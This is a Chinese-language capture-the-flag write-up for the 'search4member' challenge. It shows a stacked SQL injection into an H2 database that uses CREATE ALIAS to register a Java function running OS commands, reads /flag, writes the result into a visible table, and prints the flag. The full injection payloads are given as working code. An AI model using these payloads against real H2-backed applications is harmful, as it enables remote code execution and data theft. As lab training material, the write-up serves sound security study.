# search4member

## 题目简述

成员搜索参数被直接拼入 H2 数据库查询，并允许堆叠多条 SQL。H2 的 `CREATE ALIAS ... AS $$ Java source $$` 可以在数据库进程内编译并注册 Java 函数；因此可先注册命令执行函数，再把 `/flag` 的内容插入原本会被搜索页面展示的 `member` 表。

## 解题过程

### 注册命令执行别名

先闭合原查询，在同一请求中创建 `SHELLEXEC`：

```sql
SJTU%';
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner scanner = new java.util.Scanner(
        java.lang.Runtime.getRuntime().exec(cmd).getInputStream()
    ).useDelimiter("\\A");
    return scanner.hasNext() ? scanner.next() : "";
}
$$;
SELECT * FROM member WHERE intro LIKE '%13
```

结尾的查询片段用于重新接回应用原有 SQL 结构；实际发送时要按表单或 URL 参数进行百分号编码。

### 把命令结果写入可见表

页面只展示成员查询结果，直接执行命令未必有回显。第二个堆叠注入调用别名读取 `/flag`，并把结果放进 `blog` 字段：

```sql
SJTU%';
INSERT INTO member (id, intro, blog)
VALUES ('flag', 'flag', SHELLEXEC('cat /flag'));
SELECT * FROM member WHERE intro LIKE '%13
```

最后用关键字 `flag` 正常搜索新插入的行，即可在结果区看到：

```text
hgame{1d3aff04afa93bb481a4f176ae96381a6ce3dd13}
```

## 方法总结

- 核心技巧：H2 堆叠注入配合 `CREATE ALIAS` 注册 Java 命令执行函数，并将无回显结果写回业务表。
- 识别信号：报错或指纹指向 H2，输入点允许分号堆叠，查询结果会展示可控表字段。
- 复用要点：命令执行和结果回显是两个阶段；无直接回显时，应把输出写入可查询表、文件或其他应用可见位置。
